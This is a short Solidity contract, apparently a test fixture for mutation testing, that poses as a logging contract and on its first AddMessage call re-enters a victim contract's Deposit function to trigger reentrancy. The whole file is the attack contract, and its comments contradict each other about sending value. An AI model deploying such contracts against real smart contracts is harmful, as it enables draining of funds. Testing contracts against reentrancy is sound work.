// malicious log contract: on AddMessage it re-enters the victim C by calling Deposit (reentrancy)
contract ReentrantLog {
    address payable victim;
    bool entered;
    constructor(address _v) {
        victim = payable(_v);
    }

    // mimic the same signature
    function AddMessage(address _adr, uint _val, string memory _data) public {
        // on first invocation, attempt to re-enter victim.Deposit by sending a tiny value
        if (!entered) {
            entered = true;
            // call back into victim.Deposit to trigger reentrancy before balances updated (in mutant)
            // We need to send some wei; send 1 wei from this contract's balance.
            // Fund this contract by making a payable call to it externally is unnecessary here because
            // the reentrant call is an external call from the log contract into victim, not sending value.
            // Call Deposit without value to exercise reentrancy path.
            (bool s, ) = victim.call(abi.encodeWithSignature("Deposit()"));
            // ignore success/failure
            s; 
        }
    }

    // allow receiving ether to have balance if needed
    receive() external payable {}
}

